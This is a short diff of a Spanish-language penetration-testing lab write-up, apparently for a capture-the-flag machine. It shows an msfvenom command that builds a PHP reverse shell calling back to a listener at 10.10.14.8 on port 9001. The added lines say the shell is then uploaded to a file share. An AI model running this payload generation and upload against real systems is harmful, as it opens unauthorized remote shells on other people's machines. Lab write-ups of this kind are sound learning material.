@@ -158,4 +158,6 @@ en este punto vamos a crear una reverse shell usando `msfvenom` para subirla a e
 msfvenom -p php/reverse_php LHOST=10.10.14.8 LPORT=9001 -f raw > rawr.php
 ```
 
+despues de crear la reverse shell la subimos al recurso compartido 
 ![[Pasted image 20240810142207.png]]
+
